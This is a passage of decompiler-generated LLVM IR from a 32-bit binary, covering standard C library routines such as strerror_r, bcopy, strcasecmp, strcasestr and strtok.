  %v0_8052dde.ph.in = phi i8 [ %v4_8052dca.sink.in, %dec_label_pc_8052e00 ], [ %v3_8052dd5, %dec_label_pc_8052dd5 ]
  %v14_8052df346 = icmp eq i8 %v0_8052dde.ph.in, %v2_8052d97
  %v1_8052df648 = icmp eq i1 %v14_8052df346, false
  br i1 %v1_8052df648, label %dec_label_pc_8052dde, label %dec_label_pc_8052df8

dec_label_pc_8052dde:                             ; preds = %dec_label_pc_8052df3.preheader, %dec_label_pc_8052def
  %v0_8052dde50.in = phi i8 [ %v2_8052df0, %dec_label_pc_8052def ], [ %v0_8052dde.ph.in, %dec_label_pc_8052df3.preheader ]
  %v0_8052de249 = phi i32 [ %v1_8052def, %dec_label_pc_8052def ], [ %v0_8052e06, %dec_label_pc_8052df3.preheader ]
  %v1_8052dde = icmp eq i8 %v0_8052dde50.in, 0
  br i1 %v1_8052dde, label %dec_label_pc_8052e4c, label %dec_label_pc_8052de2

dec_label_pc_8052de2:                             ; preds = %dec_label_pc_8052dde
  %v1_8052de2 = add i32 %v0_8052de249, 1
  %v1_8052de3 = inttoptr i32 %v1_8052de2 to i8*
  %v2_8052de3 = load i8, i8* %v1_8052de3, align 1
  %v14_8052de6 = icmp eq i8 %v2_8052de3, %v2_8052d97
  br i1 %v14_8052de6, label %dec_label_pc_8052df8, label %dec_label_pc_8052deb

dec_label_pc_8052deb:                             ; preds = %dec_label_pc_8052de2
  %v1_8052deb = icmp eq i8 %v2_8052de3, 0
  br i1 %v1_8052deb, label %dec_label_pc_8052e4c, label %dec_label_pc_8052def

dec_label_pc_8052def:                             ; preds = %dec_label_pc_8052deb
  %v1_8052def = add i32 %v0_8052de249, 2
  %v1_8052df0 = inttoptr i32 %v1_8052def to i8*
  %v2_8052df0 = load i8, i8* %v1_8052df0, align 1
  %v14_8052df3 = icmp eq i8 %v2_8052df0, %v2_8052d97
  %v1_8052df6 = icmp eq i1 %v14_8052df3, false
  br i1 %v1_8052df6, label %dec_label_pc_8052dde, label %dec_label_pc_8052df8

dec_label_pc_8052df8:                             ; preds = %dec_label_pc_8052def, %dec_label_pc_8052de2, %dec_label_pc_8052df3.preheader
  %v0_8052df8 = phi i32 [ %v0_8052e06, %dec_label_pc_8052df3.preheader ], [ %v1_8052de2, %dec_label_pc_8052de2 ], [ %v1_8052def, %dec_label_pc_8052def ]
  %v1_8052df8 = add i32 %v0_8052df8, 1
  br label %dec_label_pc_8052e00

dec_label_pc_8052e00:                             ; preds = %dec_label_pc_8052dca, %dec_label_pc_8052df8
  %v0_8052e06 = phi i32 [ %v1_8052dca, %dec_label_pc_8052dca ], [ %v1_8052df8, %dec_label_pc_8052df8 ]
  %v4_8052dca.sink.in.in.in = phi i32 [ %v1_8052dca, %dec_label_pc_8052dca ], [ %v1_8052df8, %dec_label_pc_8052df8 ]
  %v4_8052dca.sink.in.in = inttoptr i32 %v4_8052dca.sink.in.in.in to i8*
  %v4_8052dca.sink.in = load i8, i8* %v4_8052dca.sink.in.in, align 1
  %storemerge5 = icmp eq i8 %v4_8052dca.sink.in, %v3_8052dbe
  %v1_8052e00 = icmp eq i1 %storemerge5, false
  br i1 %v1_8052e00, label %dec_label_pc_8052df3.preheader, label %dec_label_pc_8052e02

dec_label_pc_8052e02:                             ; preds = %dec_label_pc_8052e00
  %v1_8052e06 = add i32 %v0_8052e06, 1
  %v1_8052e0d = add i32 %v0_8052e06, -1
  %v2_8052e10 = inttoptr i32 %v1_8052e06 to i8*
  %v3_8052e10 = load i8, i8* %v2_8052e10, align 1
  %v4_8052e10 = zext i8 %v3_8052e10 to i32
  %v3_8052e14 = load i8, i8* %v2_8052e14, align 1
  %v4_8052e14 = zext i8 %v3_8052e14 to i32
  %v12_8052e19 = icmp eq i8 %v3_8052e10, %v3_8052e14
  %v1_8052e1b = icmp eq i1 %v12_8052e19, false
  br i1 %v1_8052e1b, label %dec_label_pc_8052e44, label %dec_label_pc_8052e1d

dec_label_pc_8052e1d:                             ; preds = %dec_label_pc_8052e02, %dec_label_pc_8052e31
  %v0_8052e34 = phi i32 [ %v1_8052e34, %dec_label_pc_8052e31 ], [ %v1_8052e14, %dec_label_pc_8052e02 ]
  %v0_8052e31 = phi i32 [ %v1_8052e31, %dec_label_pc_8052e31 ], [ %v1_8052e06, %dec_label_pc_8052e02 ]
  %v0_8052e1d = phi i32 [ %v3_8052e37, %dec_label_pc_8052e31 ], [ %v4_8052e10, %dec_label_pc_8052e02 ]
  %v1_8052e1d = icmp eq i32 %v0_8052e1d, 0
  br i1 %v1_8052e1d, label %dec_label_pc_8052e4e, label %dec_label_pc_8052e21

dec_label_pc_8052e21:                             ; preds = %dec_label_pc_8052e1d
  %v1_8052e21 = add i32 %v0_8052e31, 1
  %v2_8052e21 = inttoptr i32 %v1_8052e21 to i8*
  %v3_8052e21 = load i8, i8* %v2_8052e21, align 1
  %v1_8052e25 = add i32 %v0_8052e34, 1
  %v2_8052e25 = inttoptr i32 %v1_8052e25 to i8*
  %v3_8052e25 = load i8, i8* %v2_8052e25, align 1
  %v4_8052e25 = zext i8 %v3_8052e25 to i32
  %v12_8052e29 = icmp eq i8 %v3_8052e21, %v3_8052e25
  %v1_8052e2b = icmp eq i1 %v12_8052e29, false
  br i1 %v1_8052e2b, label %dec_label_pc_8052e44, label %dec_label_pc_8052e2d

dec_label_pc_8052e2d:                             ; preds = %dec_label_pc_8052e21
  %v1_8052e2d = icmp eq i8 %v3_8052e25, 0
  br i1 %v1_8052e2d, label %dec_label_pc_8052e4e, label %dec_label_pc_8052e31

dec_label_pc_8052e31:                             ; preds = %dec_label_pc_8052e2d
  %v1_8052e31 = add i32 %v0_8052e31, 2
  %v1_8052e34 = add i32 %v0_8052e34, 2
  %v1_8052e37 = inttoptr i32 %v1_8052e34 to i8*
  %v2_8052e37 = load i8, i8* %v1_8052e37, align 1
  %v3_8052e37 = zext i8 %v2_8052e37 to i32
  %v1_8052e3b = inttoptr i32 %v1_8052e31 to i8*
  %v2_8052e3b = load i8, i8* %v1_8052e3b, align 1
  %v12_8052e3e = icmp eq i8 %v2_8052e3b, %v2_8052e37
  br i1 %v12_8052e3e, label %dec_label_pc_8052e1d, label %dec_label_pc_8052e42

dec_label_pc_8052e42:                             ; preds = %dec_label_pc_8052e31
  br label %dec_label_pc_8052e44

dec_label_pc_8052e44:                             ; preds = %dec_label_pc_8052e21, %dec_label_pc_8052e02, %dec_label_pc_8052e42
  %v0_8052e44 = phi i32 [ %v4_8052e14, %dec_label_pc_8052e02 ], [ %v3_8052e37, %dec_label_pc_8052e42 ], [ %v4_8052e25, %dec_label_pc_8052e21 ]
  %v1_8052e44 = icmp eq i32 %v0_8052e44, 0
  %v1_8052e46 = icmp eq i1 %v1_8052e44, false
  br i1 %v1_8052e46, label %dec_label_pc_8052dd5, label %dec_label_pc_8052e4e

dec_label_pc_8052e4c:                             ; preds = %dec_label_pc_8052da6, %dec_label_pc_8052deb, %dec_label_pc_8052dde
  br label %dec_label_pc_8052e4e

dec_label_pc_8052e4e:                             ; preds = %dec_label_pc_8052e44, %dec_label_pc_8052e1d, %dec_label_pc_8052e2d, %entry, %dec_label_pc_8052db7, %dec_label_pc_8052e4c
  %storemerge3 = phi i32 [ 0, %dec_label_pc_8052e4c ], [ %v1_8052da6, %dec_label_pc_8052db7 ], [ %arg1, %entry ], [ %v1_8052e0d, %dec_label_pc_8052e2d ], [ %v1_8052e0d, %dec_label_pc_8052e1d ], [ %v1_8052e0d, %dec_label_pc_8052e44 ]
  store i32 %v0_8052d8b, i32* @ebx, align 4
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %v1_8052e34, { 1, 0 }
  uselistorder i32 %v1_8052e31, { 1, 0 }
  uselistorder i8 %v3_8052e25, { 1, 0, 2 }
  uselistorder i8 %v4_8052dca.sink.in, { 1, 0 }
  uselistorder i32 %v0_8052e06, { 4, 3, 2, 1, 0 }
  uselistorder i8 %v2_8052df0, { 1, 0 }
  uselistorder i32 %v1_8052def, { 0, 2, 1 }
  uselistorder i8 %v2_8052de3, { 1, 0 }
  uselistorder i32 %v0_8052de249, { 1, 0 }
  uselistorder i32 %v1_8052da6, { 0, 2, 1 }
  uselistorder i8* %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8052e4e, { 5, 0, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_8052e4c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8052e44, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052e1d, { 1, 0 }
  uselistorder label %dec_label_pc_8052e00, { 1, 0 }
  uselistorder label %dec_label_pc_8052dde, { 1, 0 }
  uselistorder label %dec_label_pc_8052df3.preheader, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp2, i32* @ebx, align 4
  %v3_8052e69 = call i32 @__xpg_strerror_r(i32 %tmp, i32 %tmp2, i32 %tmp1)
  %v0_8052e71 = load i32, i32* @ebx, align 4
  ret i32 %v0_8052e71
}

define i32 @__xpg_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-108 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  %v6_8052e8a = icmp ugt i32 %arg1, 124
  br i1 %v6_8052e8a, label %dec_label_pc_8052ea7, label %dec_label_pc_8052e8c

dec_label_pc_8052e8c:                             ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_805a300.489 to i32), i32* @esi, align 4
  %v1_8052e9c4 = icmp eq i32 %arg1, 0
  %v1_8052e9e11 = icmp eq i1 %v1_8052e9c4, false
  br i1 %v1_8052e9e11, label %dec_label_pc_8052e95, label %dec_label_pc_8052ea0

dec_label_pc_8052e95:                             ; preds = %dec_label_pc_8052e8c, %dec_label_pc_8052e95
  %v0_8052e98 = phi i32 [ %v3_8052e98, %dec_label_pc_8052e95 ], [ %arg1, %dec_label_pc_8052e8c ]
  %v0_8052e9b = phi i32 [ %v1_8052e9b, %dec_label_pc_8052e95 ], [ ptrtoint ([8 x i8]* @global_var_805a300.489 to i32), %dec_label_pc_8052e8c ]
  %v1_8052e95 = inttoptr i32 %v0_8052e9b to i8*
  %v2_8052e95 = load i8, i8* %v1_8052e95, align 1
  %v7_8052e95 = icmp eq i8 %v2_8052e95, 0
  %v2_8052e98 = zext i1 %v7_8052e95 to i32
  %v3_8052e98 = add i32 %v2_8052e98, %v0_8052e98
  %v16_8052e98 = icmp eq i32 %v3_8052e98, 0
  %v1_8052e9b = add i32 %v0_8052e9b, 1
  store i32 %v1_8052e9b, i32* @esi, align 4
  %v1_8052e9e = icmp eq i1 %v16_8052e98, false
  br i1 %v1_8052e9e, label %dec_label_pc_8052e95, label %dec_label_pc_8052ea0

dec_label_pc_8052ea0:                             ; preds = %dec_label_pc_8052e95, %dec_label_pc_8052e8c
  %v0_8052ea2 = phi i32 [ ptrtoint ([8 x i8]* @global_var_805a300.489 to i32), %dec_label_pc_8052e8c ], [ %v1_8052e9b, %dec_label_pc_8052e95 ]
  store i32 0, i32* @ebp, align 4
  %v1_8052ea2 = inttoptr i32 %v0_8052ea2 to i8*
  %v2_8052ea2 = load i8, i8* %v1_8052ea2, align 1
  %v3_8052ea2 = icmp eq i8 %v2_8052ea2, 0
  %v1_8052ea5 = icmp eq i1 %v3_8052ea2, false
  br i1 %v1_8052ea5, label %dec_label_pc_8052ea0.dec_label_pc_8052ed6_crit_edge, label %dec_label_pc_8052ea7

dec_label_pc_8052ea0.dec_label_pc_8052ed6_crit_edge: ; preds = %dec_label_pc_8052ea0
  br label %dec_label_pc_8052ed6

dec_label_pc_8052ea7:                             ; preds = %dec_label_pc_8052ea0, %entry
  %v1_8052eaa = ashr i32 %arg1, 31
  store i8* null, i8** %stack_var_-108, align 4
  store i32 22, i32* @ebp, align 4
  %v6_8052ebb = bitcast i32* %stack_var_-17 to i8*
  %v7_8052ebb = call i32 @_uintmaxtostr(i8* %v6_8052ebb, i32 %arg1, i32 %v1_8052eaa, i32 -10, i32 0)
  %v1_8052eca = add i32 %v7_8052ebb, -14
  store i32 %v1_8052eca, i32* @esi, align 4
  %v5_8052ecd = inttoptr i32 %v1_8052eca to i8*
  store i8* %v5_8052ecd, i8** %stack_var_-108, align 4
  %tmp44 = inttoptr i32 %v1_8052eca to i16*
  %v6_8052ece = call i32 @memcpy(i16* %tmp44, i32 ptrtoint ([15 x i8]* @global_var_805a2d6.490 to i32), i32 14)
  %v1_8052ee0.pre = load i32, i32* @edi, align 4
  %v0_8052ee6.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8052ed6

dec_label_pc_8052ed6:                             ; preds = %dec_label_pc_8052ea0.dec_label_pc_8052ed6_crit_edge, %dec_label_pc_8052ea7
  %v0_8052ee6 = phi i32 [ %v0_8052ea2, %dec_label_pc_8052ea0.dec_label_pc_8052ed6_crit_edge ], [ %v0_8052ee6.pre, %dec_label_pc_8052ea7 ]
  %v1_8052ee0 = phi i32 [ %arg3, %dec_label_pc_8052ea0.dec_label_pc_8052ed6_crit_edge ], [ %v1_8052ee0.pre, %dec_label_pc_8052ea7 ]
  %v4_8052ed6 = icmp eq i32 %arg2, 0
  %v3_8052ee0 = select i1 %v4_8052ed6, i32 0, i32 %v1_8052ee0
  store i32 %v3_8052ee0, i32* @edi, align 4
  %v5_8052ee6 = inttoptr i32 %v0_8052ee6 to i8*
  store i8* %v5_8052ee6, i8** %stack_var_-108, align 4
  %v3_8052ee7 = call i32 @strlen(i8* %v5_8052ee6)
  %v1_8052eef = add i32 %v3_8052ee7, 1
  store i32 %v1_8052eef, i32* %ebx.global-to-local, align 4
  %v1_8052ef2 = load i32, i32* @edi, align 4
  %tmp = icmp ugt i32 %v1_8052eef, %v1_8052ef2
  br i1 %tmp, label %dec_label_pc_8052ef6, label %dec_label_pc_8052efd

dec_label_pc_8052ef6:                             ; preds = %dec_label_pc_8052ed6
  store i32 %v1_8052ef2, i32* %ebx.global-to-local, align 4
  store i32 34, i32* @ebp, align 4
  br label %dec_label_pc_8052efd

dec_label_pc_8052efd:                             ; preds = %dec_label_pc_8052ed6, %dec_label_pc_8052ef6
  %v0_8052f02 = phi i32 [ %v1_8052eef, %dec_label_pc_8052ed6 ], [ %v1_8052ef2, %dec_label_pc_8052ef6 ]
  %v1_8052efd = icmp eq i32 %v0_8052f02, 0
  br i1 %v1_8052efd, label %dec_label_pc_8052f19, label %dec_label_pc_8052f01

dec_label_pc_8052f01:                             ; preds = %dec_label_pc_8052efd
  %v0_8052f03 = load i32, i32* @esi, align 4
  %v8_8052f04 = inttoptr i32 %arg2 to i8*
  store i8* %v8_8052f04, i8** %stack_var_-108, align 4
  %tmp45 = inttoptr i32 %arg2 to i16*
  %v6_8052f08 = call i32 @memcpy(i16* %tmp45, i32 %v0_8052f03, i32 %v0_8052f02)
  %v1_8052f14 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052f14 = add i32 %arg2, -1
  %v3_8052f14 = add i32 %v2_8052f14, %v1_8052f14
  %v4_8052f14 = inttoptr i32 %v3_8052f14 to i8*
  store i8 0, i8* %v4_8052f14, align 1
  br label %dec_label_pc_8052f19

dec_label_pc_8052f19:                             ; preds = %dec_label_pc_8052efd, %dec_label_pc_8052f01
  %v0_8052f19 = load i32, i32* @ebp, align 4
  %v1_8052f19 = icmp eq i32 %v0_8052f19, 0
  br i1 %v1_8052f19, label %dec_label_pc_8052f24, label %dec_label_pc_8052f1d

dec_label_pc_8052f1d:                             ; preds = %dec_label_pc_8052f19
  %v0_8052f1d = load i8*, i8** %stack_var_-108, align 4
  %v1_8052f1d = ptrtoint i8* %v0_8052f1d to i32
  %v2_8052f1d = call i32 @__errno_location(i32 %v1_8052f1d)
  %v0_8052f22 = load i32, i32* @ebp, align 4
  %v2_8052f22 = inttoptr i32 %v2_8052f1d to i32*
  store i32 %v0_8052f22, i32* %v2_8052f22, align 4
  %v0_8052f27.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_8052f24

dec_label_pc_8052f24:                             ; preds = %dec_label_pc_8052f19, %dec_label_pc_8052f1d
  %v0_8052f27 = phi i32 [ 0, %dec_label_pc_8052f19 ], [ %v0_8052f27.pre, %dec_label_pc_8052f1d ]
  ret i32 %v0_8052f27

; uselistorder directives
  uselistorder i32 %v1_8052ef2, { 1, 2, 0 }
  uselistorder i32 %v1_8052eef, { 1, 0, 2 }
  uselistorder i32 %v1_8052e9b, { 0, 2, 1 }
  uselistorder i32 %v3_8052e98, { 1, 0 }
  uselistorder i8** %stack_var_-108, { 4, 3, 2, 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_805a300.489 to i32), { 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 3, 2, 1 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_8052f24, { 1, 0 }
  uselistorder label %dec_label_pc_8052f19, { 1, 0 }
  uselistorder label %dec_label_pc_8052efd, { 1, 0 }
  uselistorder label %dec_label_pc_8052ed6, { 1, 0 }
  uselistorder label %dec_label_pc_8052e95, { 1, 0 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_8052f40 = inttoptr i32 %arg2 to i8*
  %v3_8052f40 = call i32 @memmove(i8* %v2_8052f40, i32 %arg1)
  ret i32 %v3_8052f40
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8052f49 = load i32, i32* bitcast (i32** @global_var_805c4e0.492 to i32*), align 32
  %v4_8052f52 = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_8052f5a

dec_label_pc_8052f5a:                             ; preds = %dec_label_pc_8052f77, %entry
  %storemerge = phi i32 [ %v4_8052f52, %entry ], [ %v1_8052f78, %dec_label_pc_8052f77 ]
  %v0_8052f78 = phi i32 [ %v4_8052f52, %entry ], [ %v1_8052f78, %dec_label_pc_8052f77 ]
  %v0_8052f7d7 = phi i32 [ 0, %entry ], [ %v0_8052f7d8, %dec_label_pc_8052f77 ]
  %v0_8052f77 = phi i32 [ %arg2, %entry ], [ %v1_8052f77, %dec_label_pc_8052f77 ]
  store i32 %storemerge, i32* @ecx, align 4
  %v12_8052f5a = icmp eq i32 %v0_8052f78, %v0_8052f77
  %.pre = inttoptr i32 %v0_8052f78 to i8*
  br i1 %v12_8052f5a, label %dec_label_pc_8052f72, label %dec_label_pc_8052f5e

dec_label_pc_8052f5e:                             ; preds = %dec_label_pc_8052f5a
  %v2_8052f5e = load i8, i8* %.pre, align 1
  %v3_8052f5e = zext i8 %v2_8052f5e to i32
  %v2_8052f61 = mul nuw nsw i32 %v3_8052f5e, 2
  %v3_8052f61 = add i32 %v2_8052f61, %v0_8052f49
  %v4_8052f61 = inttoptr i32 %v3_8052f61 to i16*
  %v5_8052f61 = load i16, i16* %v4_8052f61, align 2
  %v6_8052f61 = sext i16 %v5_8052f61 to i32
  %v1_8052f65 = inttoptr i32 %v0_8052f77 to i8*
  %v2_8052f65 = load i8, i8* %v1_8052f65, align 1
  %v3_8052f65 = zext i8 %v2_8052f65 to i32
  %v2_8052f68 = mul nuw nsw i32 %v3_8052f65, 2
  %v3_8052f68 = add i32 %v2_8052f68, %v0_8052f49
  %v4_8052f68 = inttoptr i32 %v3_8052f68 to i16*
  %v5_8052f68 = load i16, i16* %v4_8052f68, align 2
  %v6_8052f68 = sext i16 %v5_8052f68 to i32
  %v2_8052f6c = sub nsw i32 %v6_8052f61, %v6_8052f68
  %v12_8052f6c = icmp eq i32 %v2_8052f6c, 0
  store i32 %v2_8052f6c, i32* @edx, align 4
  %v1_8052f70 = icmp eq i1 %v12_8052f6c, false
  br i1 %v1_8052f70, label %dec_label_pc_8052f7b, label %dec_label_pc_8052f72

dec_label_pc_8052f72:                             ; preds = %dec_label_pc_8052f5a, %dec_label_pc_8052f5e
  %v0_8052f7d8 = phi i32 [ %v2_8052f6c, %dec_label_pc_8052f5e ], [ %v0_8052f7d7, %dec_label_pc_8052f5a ]
  %v2_8052f72 = load i8, i8* %.pre, align 1
  %v3_8052f72 = icmp eq i8 %v2_8052f72, 0
  br i1 %v3_8052f72, label %dec_label_pc_8052f7b, label %dec_label_pc_8052f77

dec_label_pc_8052f77:                             ; preds = %dec_label_pc_8052f72
  %v1_8052f77 = add i32 %v0_8052f77, 1
  %v1_8052f78 = add i32 %v0_8052f78, 1
  br label %dec_label_pc_8052f5a

dec_label_pc_8052f7b:                             ; preds = %dec_label_pc_8052f72, %dec_label_pc_8052f5e
  %v0_8052f7d = phi i32 [ %v0_8052f7d8, %dec_label_pc_8052f72 ], [ %v2_8052f6c, %dec_label_pc_8052f5e ]
  ret i32 %v0_8052f7d

; uselistorder directives
  uselistorder i32 %v1_8052f78, { 1, 0 }
  uselistorder i32 %v0_8052f7d8, { 1, 0 }
  uselistorder i32 %v2_8052f6c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8052f77, { 1, 2, 0 }
  uselistorder i32 %v0_8052f78, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052f72, { 1, 0 }
}

define i32 @strcasestr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8052f83 = load i32, i32* @ebx, align 4
  %v4_8052f87 = ptrtoint i8* %arg1 to i32
  %v1_8052f9318 = inttoptr i32 %arg2 to i8*
  %v2_8052f931932 = load i8, i8* %v1_8052f9318, align 1
  %v4_8052f952336 = icmp eq i8 %v2_8052f931932, 0
  %v1_8052f972538 = icmp eq i1 %v4_8052f952336, false
  br i1 %v1_8052f972538, label %dec_label_pc_8052f9d.lr.ph.lr.ph, label %dec_label_pc_8052fcd

dec_label_pc_8052f9d.lr.ph.lr.ph:                 ; preds = %entry
  %v3_8052f932033 = zext i8 %v2_8052f931932 to i32
  %v4_8052f93.pre.pre = load i32, i32* @eax, align 4
  %v5_8052f932134 = and i32 %v4_8052f93.pre.pre, -256
  %v6_8052f932235 = or i32 %v3_8052f932033, %v5_8052f932134
  %v4_8052f9d.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8052f9d.lr.ph

dec_label_pc_8052f9d.lr.ph:                       ; preds = %dec_label_pc_8052f9d.lr.ph.lr.ph, %dec_label_pc_8052fc8
  %v4_8052f9d.pre = phi i32 [ %v4_8052f9d.pre.pre, %dec_label_pc_8052f9d.lr.ph.lr.ph ], [ %v0_8052fa7, %dec_label_pc_8052fc8 ]
  %v6_8052f932241 = phi i32 [ %v6_8052f932235, %dec_label_pc_8052f9d.lr.ph.lr.ph ], [ %v6_8052f9322, %dec_label_pc_8052fc8 ]
  %v2_8052f931940 = phi i8 [ %v2_8052f931932, %dec_label_pc_8052f9d.lr.ph.lr.ph ], [ %v2_8052f9319, %dec_label_pc_8052fc8 ]
  %v0_8052fc839 = phi i32 [ %v4_8052f87, %dec_label_pc_8052f9d.lr.ph.lr.ph ], [ %v1_8052fc8, %dec_label_pc_8052fc8 ]
  br label %dec_label_pc_8052f9d

dec_label_pc_8052f9d:                             ; preds = %dec_label_pc_8052f9d.lr.ph, %dec_label_pc_8052fbd
  %v4_8052f9d = phi i32 [ %v4_8052f9d.pre, %dec_label_pc_8052f9d.lr.ph ], [ %v4_8052f9d46, %dec_label_pc_8052fbd ]
  %v6_8052f9330 = phi i32 [ %v6_8052f932241, %dec_label_pc_8052f9d.lr.ph ], [ %v6_8052f93, %dec_label_pc_8052fbd ]
  %v2_8052f9329 = phi i8 [ %v2_8052f931940, %dec_label_pc_8052f9d.lr.ph ], [ %v2_8052f93, %dec_label_pc_8052fbd ]
  %v1_8052f9328 = phi i8* [ %v1_8052f9318, %dec_label_pc_8052f9d.lr.ph ], [ %v1_8052f93, %dec_label_pc_8052fbd ]
  %v0_8052fbd27 = phi i32 [ %arg2, %dec_label_pc_8052f9d.lr.ph ], [ %v1_8052fbd, %dec_label_pc_8052fbd ]
  %v0_8052fbe26 = phi i32 [ %v0_8052fc839, %dec_label_pc_8052f9d.lr.ph ], [ %v1_8052fbe, %dec_label_pc_8052fbd ]
  %v1_8052f9d = inttoptr i32 %v0_8052fbe26 to i8*
  %v2_8052f9d = load i8, i8* %v1_8052f9d, align 1
  %v3_8052f9d = zext i8 %v2_8052f9d to i32
  %v5_8052f9d = and i32 %v4_8052f9d, -256
  %v6_8052f9d = or i32 %v5_8052f9d, %v3_8052f9d
  %v15_8052f9f = icmp eq i8 %v2_8052f9329, %v2_8052f9d
  br i1 %v15_8052f9f, label %dec_label_pc_8052fbd, label %dec_label_pc_8052fa7

dec_label_pc_8052fa7:                             ; preds = %dec_label_pc_8052f9d
  %v0_8052fa7 = load i32, i32* bitcast (i32** @global_var_805c4e0.492 to i32*), align 32
  %v2_8052fad = load i8, i8* %v1_8052f9d, align 1
  %v3_8052fad = zext i8 %v2_8052fad to i32
  %v2_8052fb0 = load i8, i8* %v1_8052f9328, align 1
  %v3_8052fb0 = zext i8 %v2_8052fb0 to i32
  %v2_8052fb3 = mul nuw nsw i32 %v3_8052fad, 2
  %v3_8052fb3 = add i32 %v2_8052fb3, %v0_8052fa7
  %v4_8052fb3 = inttoptr i32 %v3_8052fb3 to i16*
  %v5_8052fb3 = load i16, i16* %v4_8052fb3, align 2
  %v6_8052fb3 = zext i16 %v5_8052fb3 to i32
  %v4_8052fb7 = mul nuw nsw i32 %v3_8052fb0, 2
  %v5_8052fb7 = add i32 %v4_8052fb7, %v0_8052fa7
  %v6_8052fb7 = inttoptr i32 %v5_8052fb7 to i16*
  %v7_8052fb7 = load i16, i16* %v6_8052fb7, align 2
  %v18_8052fb7 = icmp eq i16 %v5_8052fb3, %v7_8052fb7
  %v1_8052fbb = icmp eq i1 %v18_8052fb7, false
  br i1 %v1_8052fbb, label %dec_label_pc_8052fc1, label %dec_label_pc_8052fbd

dec_label_pc_8052fbd:                             ; preds = %dec_label_pc_8052fa7, %dec_label_pc_8052f9d
  %v4_8052f9d46 = phi i32 [ %v0_8052fa7, %dec_label_pc_8052fa7 ], [ %v6_8052f9d, %dec_label_pc_8052f9d ]
  %v4_8052f936 = phi i32 [ %v6_8052fb3, %dec_label_pc_8052fa7 ], [ %v6_8052f9330, %dec_label_pc_8052f9d ]
  %v1_8052fbd = add i32 %v0_8052fbd27, 1
  %v1_8052fbe = add i32 %v0_8052fbe26, 1
  %v1_8052f93 = inttoptr i32 %v1_8052fbd to i8*
  %v2_8052f93 = load i8, i8* %v1_8052f93, align 1
  %v3_8052f93 = zext i8 %v2_8052f93 to i32
  %v5_8052f93 = and i32 %v4_8052f936, -256
  %v6_8052f93 = or i32 %v3_8052f93, %v5_8052f93
  %v4_8052f95 = icmp eq i8 %v2_8052f93, 0
  %v1_8052f97 = icmp eq i1 %v4_8052f95, false
  br i1 %v1_8052f97, label %dec_label_pc_8052f9d, label %dec_label_pc_8052fcd

dec_label_pc_8052fc1:                             ; preds = %dec_label_pc_8052fa7
  %v4_8052fc1 = icmp eq i8 %v2_8052f9d, 0
  br i1 %v4_8052fc1, label %dec_label_pc_8052fcb, label %dec_label_pc_8052fc8

dec_label_pc_8052fc8:                             ; preds = %dec_label_pc_8052fc1
  %v1_8052fc8 = add i32 %v0_8052fc839, 1
  %v2_8052f9319 = load i8, i8* %v1_8052f9318, align 1
  %v3_8052f9320 = zext i8 %v2_8052f9319 to i32
  %v5_8052f9321 = and i32 %v6_8052fb3, 65280
  %v6_8052f9322 = or i32 %v3_8052f9320, %v5_8052f9321
  %v4_8052f9523 = icmp eq i8 %v2_8052f9319, 0
  %v1_8052f9725 = icmp eq i1 %v4_8052f9523, false
  br i1 %v1_8052f9725, label %dec_label_pc_8052f9d.lr.ph, label %dec_label_pc_8052fcd

dec_label_pc_8052fcb:                             ; preds = %dec_label_pc_8052fc1
  br label %dec_label_pc_8052fcd

dec_label_pc_8052fcd:                             ; preds = %dec_label_pc_8052fc8, %entry, %dec_label_pc_8052fbd, %dec_label_pc_8052fcb
  %storemerge = phi i32 [ 0, %dec_label_pc_8052fcb ], [ %v4_8052f87, %entry ], [ %v1_8052fc8, %dec_label_pc_8052fc8 ], [ %v0_8052fc839, %dec_label_pc_8052fbd ]
  store i32 %v0_8052f83, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_8052f9319, { 1, 2, 0 }
  uselistorder i8 %v2_8052f93, { 1, 2, 0 }
  uselistorder i8* %v1_8052f93, { 1, 0 }
  uselistorder i32 %v0_8052fa7, { 1, 2, 3, 0 }
  uselistorder i8 %v2_8052f9d, { 1, 0, 2 }
  uselistorder i32 %v0_8052fbe26, { 1, 0 }
  uselistorder i8 %v2_8052f931932, { 0, 2, 1 }
  uselistorder i8* %v1_8052f9318, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052fcd, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8052f9d, { 1, 0 }
  uselistorder label %dec_label_pc_8052f9d.lr.ph, { 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_8052fe4 = inttoptr i32 %arg1 to i8*
  %v4_8052fe4 = call i32 @strtok_r(i8* %v3_8052fe4, i32 %arg2, i32 ptrtoint (i32* @global_var_8062560.493 to i32))
  ret i32 %v4_8052fe4
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-60 = alloca i32, align 4
